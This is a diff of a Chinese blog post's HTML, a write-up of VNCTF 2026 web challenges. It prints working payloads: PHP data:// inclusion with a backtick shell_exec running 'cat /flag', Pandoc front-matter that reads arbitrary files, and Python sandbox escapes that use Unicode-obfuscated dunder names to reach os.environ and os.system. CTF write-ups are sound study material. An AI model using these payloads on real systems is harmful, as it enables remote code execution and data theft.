@@ -19,36 +19,36 @@
   <meta name="author" content="Zomon">
   <meta name="keywords" content="Zomon">
   
-    <meta name="description" content="Signin审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’] 由GET体file传参进行文件包含（当file长度小等于20时） 于是便可以用data协议进行文件上传包含，但是&#x2F;&#x2F;被ban，所以可以用短符号简写绕过：data;, 然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写">
+    <meta name="description" content="前言​	这是我学web半年来打的第一场有关战队的比赛，只能说又开了眼界，被很多新的解题技巧迷得眼花缭乱，虽然差了个java反序列化没做出来，但还是很开心，毕竟这是我第一次打进前40名并且还是第一次解出难度为困难的题目（附一张解题照片） 希望来年加油技术提升吧！！！！  Signin审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’] 由GE">
 <meta property="og:type" content="article">
-<meta property="og:title" content="VNCTF 2026">
+<meta property="og:title" content="Zomon&#39;s Blog">
 <meta property="og:url" content="https://zomonp.github.io/myblog/2026/02/14/VNCTF-2026/index.html">
 <meta property="og:site_name" content="Zomon&#39;s Blog">
-<meta property="og:description" content="Signin审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’] 由GET体file传参进行文件包含（当file长度小等于20时） 于是便可以用data协议进行文件上传包含，但是&#x2F;&#x2F;被ban，所以可以用短符号简写绕过：data;, 然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写">
+<meta property="og:description" content="前言​	这是我学web半年来打的第一场有关战队的比赛，只能说又开了眼界，被很多新的解题技巧迷得眼花缭乱，虽然差了个java反序列化没做出来，但还是很开心，毕竟这是我第一次打进前40名并且还是第一次解出难度为困难的题目（附一张解题照片） 希望来年加油技术提升吧！！！！  Signin审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’] 由GE">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/11.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/1.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/2.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/3.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/4.png">
-<meta property="og:image" content="https://zomonp.github.io/myblog/flag">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/5.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/6.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/7.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/8.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/9.png">
 <meta property="og:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/10.png">
-<meta property="article:published_time" content="2026-02-14T11:19:04.000Z">
-<meta property="article:modified_time" content="2026-02-14T11:57:15.284Z">
+<meta property="article:published_time" content="2026-02-14T11:19:04.084Z">
+<meta property="article:modified_time" content="2026-02-14T12:10:32.522Z">
 <meta property="article:author" content="Zomon">
-<meta property="article:tag" content="比赛">
+<meta property="article:tag" content="Zomon">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/1.png">
+<meta name="twitter:image" content="https://zomonp.github.io/myblog/img/VNCTF_2026/11.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>VNCTF 2026 - Zomon&#39;s Blog</title>
+  <title>Zomon&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -225,7 +225,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="VNCTF 2026"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -248,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.8k 字
+          3k 字
         
       </span>
     
@@ -259,7 +259,7 @@
         
         
         
-          24 分钟
+          25 分钟
         
       </span>
     
@@ -305,12 +305,15 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">VNCTF 2026</h1>
+            <h1 id="seo-header"></h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a><strong>Signin</strong></h1><p>审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’]</p>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​	这是我学web半年来打的第一场有关战队的比赛，只能说又开了眼界，被很多新的解题技巧迷得眼花缭乱，虽然差了个java反序列化没做出来，但还是很开心，毕竟这是我第一次打进前40名并且还是第一次解出难度为困难的题目（附一张解题照片）</p>
+<p>希望来年加油技术提升吧！！！！</p>
+<p><img src="/myblog/img/VNCTF_2026/11.png" srcset="/myblog/img/loading.gif" lazyload alt="图片描述"></p>
+<h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a><strong>Signin</strong></h1><p>审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’]</p>
 <p>由GET体file传参进行文件包含（当file长度小等于20时）</p>
 <p>于是便可以用data协议进行文件上传包含，但是&#x2F;&#x2F;被ban，所以可以用短符号简写绕过：data;,<br> 然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写出以下payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:,<span class="hljs-meta">&lt;?php</span>info();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -322,7 +325,9 @@
 <p>于是上网搜得反引号是 shell_exec() 的语法糖</p>
 <p>即<code>$_GET[0]</code> &#x3D;&#x3D;&#x3D; shell_exec($_GET[0])</p>
 <p>（题目不支持POST传参）</p>
-<p>所以构得最后payload：?file&#x3D;data:,&lt;?&#x3D;<code>$_GET[x]</code>;&amp;x&#x3D;cat &#x2F;flag</p>
+<p>所以构得最后payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:,<span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[x]`;&amp;x=cat /flag<br></code></pre></td></tr></table></figure>
+
 <p>得到flag</p>
 <p><img src="/myblog/img/VNCTF_2026/2.png" srcset="/myblog/img/loading.gif" lazyload alt="图片描述"></p>
 <h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a><strong>渗透测试</strong></h1><p>题目是一个登录框，给了一个密码附件，很明显是要去爆破密码，一共两万个密码（）</p>
@@ -333,18 +338,17 @@
 <p>题目提示了</p>
 <p><img src="/myblog/img/VNCTF_2026/4.png" srcset="/myblog/img/loading.gif" lazyload alt="图片描述"></p>
 <p>于是只能上网搜一下这几种文件都有哪些可能的漏洞</p>
-<p>发现可以试试tamplate模板注入，于是构造payload：<br> -–</p>
-<p>template: &#x2F;flag</p>
-<p>-–</p>
-<p>xxxxxxxxx（一定要写）</p>
+<p>发现可以试试tamplate模板注入，于是构造payload：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"> \<span class="hljs-params">---</span><br><br>template: <span class="hljs-string">/flag</span><br><br>\<span class="hljs-params">---</span><br><br> <br><br>xxxxxxxxx（一定要写）<br></code></pre></td></tr></table></figure>
+
 <p>上传，发现被拦截了</p>
 <p>template和reference-doc被过滤，pdf文件有上传不了，只能试试通过资源文件引用+EPUB打包机制 进行任意文件读取，或者通过文件名注入命令了</p>
 <p>首先是看了上传后文件名会被重新修改，于是随便上传了一个名为<?phpinfo();?>.md的文件。但是没用</p>
 <p>那就只能试试Pandoc的特性:<br> Pandoc生成EPUB时，有一个特性叫 “Resource Fetching”（资源抓取），只要通过构造特殊的资源抓取语句来改变EPUB抓取的资源的路径即可达到类似于“文件包含”的效果，将flag打包下载下来</p>
-<p>Payload（可以多设几条路径提高拿到flag的概率）：<br> -–</p>
-<p>resource-path: [“&#x2F;“, “&#x2F;tmp”, “&#x2F;home&#x2F;ctf”, “.”]</p>
-<p>-–</p>
-<p><img src="/myblog/flag" srcset="/myblog/img/loading.gif" lazyload alt="flag"><br> 下载下来后可以改后缀为.zip来解压</p>
+<p>Payload（可以多设几条路径提高拿到flag的概率）：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lua"> \<span class="hljs-comment">---</span><br><br>resource-<span class="hljs-built_in">path</span>: [<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;/home/ctf&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>]<br><br>\<span class="hljs-comment">---</span><br><br> <br><br>![flag](/flag)<br></code></pre></td></tr></table></figure>
+
+<p> 下载下来后可以改后缀为.zip来解压</p>
 <p>在解压包中拿到flag：</p>
 <p><img src="/myblog/img/VNCTF_2026/5.png" srcset="/myblog/img/loading.gif" lazyload alt="图片描述"></p>
 <p><img src="/myblog/img/VNCTF_2026/6.png" srcset="/myblog/img/loading.gif" lazyload alt="图片描述"></p>
@@ -361,61 +365,22 @@
 <p>但是不知道为啥始终返回空白</p>
 <p>等后面群里师傅说在环境变量里也有flag才找到另一条生路</p>
 <p>首先鉴于单行字符不能超过30，所以采用拼接的方式串联起payload：</p>
-<p>a&#x3D;()</p>
-<p>b&#x3D;a.<em>﹍𝓬𝓵𝓪𝓼𝓼﹍</em></p>
-<p>c&#x3D;b.<em>﹍𝓫𝓪𝓼𝓮﹍</em></p>
-<p>d&#x3D;c.<em>﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍</em>()</p>
-<p>for x in d:</p>
-<p> try:</p>
-<p> g&#x3D;x.<em>﹍𝓲𝓷𝓲𝓽﹍</em>.<em>﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍</em></p>
-<p>except:pass</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br><span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
+
 <p>随后就是通过报错</p>
 <p>（触发AssertionError: &lt;r的内容&gt;，**错误信息一定会显示在网页回显中）**读取environ字典了</p>
-<p>a&#x3D;()</p>
-<p>b&#x3D;a.<em>﹍𝓬𝓵𝓪𝓼𝓼﹍</em></p>
-<p>c&#x3D;b.<em>﹍𝓫𝓪𝓼𝓮﹍</em></p>
-<p>d&#x3D;c.<em>﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍</em>()</p>
-<p>r&#x3D;()</p>
-<p>for x in d:</p>
-<p> try:</p>
-<p> g&#x3D;x.<em>﹍𝓲𝓷𝓲𝓽﹍</em>.<em>﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍</em></p>
-<p> e&#x3D;g.get(k).environ</p>
-<p> r&#x3D;e</p>
-<p> except:pass</p>
-<p>assert …!&#x3D;…,r</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br>r=()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br> e=g.get(k).environ<br><br> r=e<br><br> <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure>
+
 <p>但是这个回显是</p>
 <p><img src="/myblog/img/VNCTF_2026/9.png" srcset="/myblog/img/loading.gif" lazyload alt="图片描述"></p>
 <p>跟ai探讨了一个小时左右，发现原来不是模块被删了，而是放到别的模块去了（应该是的），所以只能利用一个try&#x2F;expect循环遍历__init__.__globals__找到包含os模块的globals</p>
-<p>最后生成的payload如下：<br> a&#x3D;()</p>
-<p>b&#x3D;a.<em>﹍𝓬𝓵𝓪𝓼𝓼﹍</em></p>
-<p>c&#x3D;b.<em>﹍𝓫𝓪𝓼𝓮﹍</em></p>
-<p>d&#x3D;c.<em>﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍</em>()</p>
-<p>r&#x3D;()</p>
-<p>for x in d:</p>
-<p> try:</p>
-<p> g&#x3D;x.<em>﹍𝓲𝓷𝓲𝓽﹍</em>.<em>﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍</em></p>
-<p> for k in g:</p>
-<p>  try:</p>
-<p>  e&#x3D;g.get(k).environ</p>
-<p>  r&#x3D;e</p>
-<p>  except:pass</p>
-<p> except:pass</p>
-<p>assert …!&#x3D;…,r</p>
+<p>最后生成的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br>r=()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> g:<br><br>  <span class="hljs-keyword">try</span>:<br><br>  e=g.get(k).environ<br><br>  r=e<br><br>  <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><br> <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure>
+
 <p>在环境变量中找到flag：<br> <img src="/myblog/img/VNCTF_2026/10.png" srcset="/myblog/img/loading.gif" lazyload alt="图片描述"></p>
 <p>其实我本来是想把flag导入到同目录的文件中的</p>
-<p>a&#x3D;()</p>
-<p>b&#x3D;a.<em>﹍𝓬𝓵𝓪𝓼𝓼﹍</em></p>
-<p>c&#x3D;b.<em>﹍𝓫𝓪𝓼𝓮﹍</em></p>
-<p>d&#x3D;c.<em>﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍</em>()</p>
-<p>r&#x3D;()</p>
-<p>for x in d:</p>
-<p> try:</p>
-<p> g&#x3D;x.<em>﹍𝓲𝓷𝓲𝓽﹍</em>.<em>﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍</em></p>
-<p> h&#x3D;g.get(ʼosʼ)</p>
-<p> h.system(ʼcat &#x2F;flag&gt;&#x2F;tmp&#x2F;aʼ)</p>
-<p> except:</p>
-<p> pass</p>
-<p>assert …!&#x3D;…,r</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br>r=()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br> h=g.get(ʼosʼ)<br><br> h.system(ʼcat /flag&gt;/tmp/aʼ)<br><br> <span class="hljs-keyword">except</span>:<br><br> <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure>
+
 <p>但是代码太长了，导致不能实现</p>
 
                 
@@ -425,34 +390,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/myblog/categories/%E6%AF%94%E8%B5%9Bwp/" class="category-chain-item">比赛wp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/myblog/tags/%E6%AF%94%E8%B5%9B/" class="print-no-link">#比赛</a>
-      
-    </div>
   
 </div>
 
@@ -462,7 +399,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>VNCTF 2026</div>
+      <div></div>
       <div>https://zomonp.github.io/myblog/2026/02/14/VNCTF-2026/</div>
     </div>
     <div class="license-meta">
